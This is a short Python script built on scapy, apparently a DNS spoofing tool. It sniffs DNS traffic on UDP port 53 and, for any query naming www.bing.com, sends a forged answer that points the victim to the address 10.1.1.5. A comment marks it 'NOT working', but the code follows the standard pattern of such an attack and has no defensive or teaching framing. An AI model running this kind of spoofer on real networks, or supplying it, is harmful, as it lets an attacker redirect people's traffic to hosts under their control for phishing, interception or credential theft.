#!/usr/bin/env python3
import scapy.all as scapy
import socket
import asyncio

# NOT working
# Define the fake IP to return for spoofed domains
FAKE_IP = "10.1.1.5"
SPOOF_SITE ="www.bing.com"

def handle_dns_request(packet):
    if packet.haslayer(scapy.DNSQR):  # Check if the packet is a DNS request
        qname = packet[scapy.DNSQR].qname.decode()

        if SPOOF_SITE in qname:
            print(f"[+] Spoofing target: {qname}")

            # Construct the spoofed DNS response
            spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                          scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                          scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,
                                    an=scapy.DNSRR(rrname=qname, ttl=60, rdata=FAKE_IP))

            print(spoofed_pkt)
            scapy.send(spoofed_pkt, verbose=False)

def packet_sniffer():
    print("[*] Starting DNS Spoofer...")
    scapy.sniff(filter="udp port 53", prn=handle_dns_request, store=False)

if __name__ == "__main__":
    packet_sniffer()
